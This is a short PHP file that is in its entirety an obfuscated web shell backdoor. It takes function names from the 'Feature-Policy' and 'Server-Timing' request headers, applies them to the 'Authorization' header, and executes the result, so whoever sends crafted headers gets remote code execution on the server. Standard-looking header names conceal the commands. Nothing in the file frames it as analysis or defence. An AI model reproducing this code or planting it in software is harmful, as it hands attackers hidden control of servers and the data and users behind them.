<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $request = $_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Authorization']));
    $request();
}